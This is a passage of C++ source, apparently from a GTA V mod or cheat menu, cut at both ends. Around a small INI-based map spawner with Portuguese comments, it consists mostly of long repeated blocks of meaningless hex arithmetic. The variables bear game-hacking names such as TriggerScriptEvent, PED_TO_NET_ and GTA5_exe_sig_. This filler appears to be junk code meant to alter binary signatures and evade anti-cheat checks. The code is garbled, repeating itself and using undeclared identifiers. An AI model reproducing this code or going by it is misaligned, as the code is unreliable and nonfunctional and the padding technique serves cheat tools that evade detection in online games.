				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Spawn.RotZ = Extern_Reader::INIFile::Float::LerFloat(buffer, "RotZ");
				//Void de spawn aqui
				/*
				cout << "[" << i << "]" << endl;
				cout << "Model=" << i << Spawn.Model << endl;
				cout << "PosX=" << i << Spawn.PosX << endl;
				cout << "PosY=" << i << Spawn.PosY << endl;
				cout << "PosZ=" << i << Spawn.PosZ << endl;
				cout << "RotX=" << i << Spawn.RotX << endl;
				cout << "RotY=" << i << Spawn.RotY << endl;
				cout << "RotZ=" << i << Spawn.RotZ << endl;
				*/
			}
		}
	}
	void LoadMap_Vehicles(std::string INIPath)
	{
		//Exemplo::
		//GTA::LoadMap_Props(".\\Mapa.ini");
		//

		if (offset > aaaaaa)
		{
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
			matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
			matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
		}
		else
		{
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
		}
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
		a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
		a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
		if (matriz[4] > 50.0f)
		{
			matriz[4] = matriz[1];
		}
		a2 = (matriz[4]) / (2 * matriz[2]);
		a1 = (matriz[3] + (2)) / (2 * matriz[2]);
		offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (matriz[3] + (5)) / (2 * matriz[2]);
		aaaaaa = ponteiro * 2;
		a = 0.0f;
		a1 = (matriz[3] + (4)) / (2 * matriz[2]);
		b = 0.0f;
		matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
		a2 = (matriz[4] + (3)) / (2 * matriz[2]);
		offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
		matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
		matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
		matriz[4] = matriz[1];
		matriz[7] = (0xB1231 * 0xA) + matriz[2];
		offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
		offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
		matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
		a2 = (matriz[4] + (3)) / (2 * matriz[2]);
		a2 = (matriz[4] + (2)) / (2 * matriz[2]);
		offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
		offset = (0xB1231 * 0xA) + 0xA12;
		offset = (0xB1231 * 0xA) + 0xA12;
		if (offset > aaaaaa)
		{
		}
		else
			a1 = (matriz[3] + (65)) / (2 * matriz[2]);
		a2 = (matriz[4] - (3)) / (2 * matriz[2]);

		if (matriz[1] > aaaaaa)
		{
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
			matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
		}
		else
		{
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
		}
		matriz[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
		a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
		matriz[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
		a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
		a = 0.0f;
		b = 0.0f;
		if (matriz[4] > 50.0f)
		{
			matriz[4] = matriz[1];
		}
		a2 = (matriz[4]) / (2 * matriz[2]);
		a1 = (matriz[3] + (2)) / (2 * matriz[2]);
		matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
		matriz[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (matriz[3] + (5)) / (2 * matriz[2]);
		aaaaaa = 0xB2 * 2;
		a = 0.0f;
		a1 = (matriz[3] + (4)) / (2 * matriz[2]);
		b = 0.0f;
		matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
		a2 = (matriz[4] + (3)) / (2 * matriz[2]);
		matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
		matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
		matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
		matriz[4] = matriz[1];
		matriz[7] = (0xB1231 * 0xA) + matriz[2];
		matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
		matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
		matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
		a2 = (matriz[4] + (3)) / (2 * matriz[2]);
		a2 = (matriz[4] + (2)) / (2 * matriz[2]);
		matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
		matriz[1] = (0xB1231 * 0xA) + 0xA12;
		matriz[1] = (0xB1231 * 0xA) + 0xA12;
		if (matriz[1] > aaaaaa)
		{
		}
		else
			a1 = (matriz[3] + (65)) / (2 * matriz[2]);
		a2 = (matriz[4] - (3)) / (2 * matriz[2]);

		if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
		}
		else
		{
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
		}
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
		a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
		if (GTA5_exe_sig_[4] > 50.0f)
		{
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
		}
		a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
		a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
		NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
		a = 0.0f;
		a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
		b = 0.0f;
		GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
		a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
		offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
		GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
		GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
		GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
		GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
		offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
		offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
		GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
		a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
		a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
		offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
		offset = (0xB1231 * 0xA) + 0xA12;
		offset = (0xB1231 * 0xA) + 0xA12;
		if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
		}
		else
			a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
		a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

		if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
		}
		else
		{
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
		}
		GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
		a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
		GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
		a = 0.0f;
		b = 0.0f;
		if (GTA5_exe_sig_[4] > 50.0f)
		{
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
		}
		a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
		a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
		GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
		NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
		a = 0.0f;
		a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
		b = 0.0f;
		GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
		a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
		GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
		GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
		GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
		GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
		GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
		GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
		GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
		GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
		a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
		a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
		GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
		GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
		GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
		if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
		}
		else
